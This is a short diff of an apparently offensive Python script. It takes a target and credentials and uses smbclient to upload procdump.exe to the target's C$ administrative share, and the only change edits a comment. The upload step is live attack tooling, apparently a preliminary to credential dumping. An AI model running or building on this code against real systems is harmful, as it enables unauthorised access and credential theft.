@@ -16,7 +16,7 @@ parser.add_argument("--password", "-p", help="Set the target password", dest="pa
 #parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain")
 args = parser.parse_args()
 
-#upload procdump and fun.bat
+#upload procdump
 print (colored("\nUploading procdump", "green"))
 subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username+"%"+args.password,"-c put procdump.exe"])
 
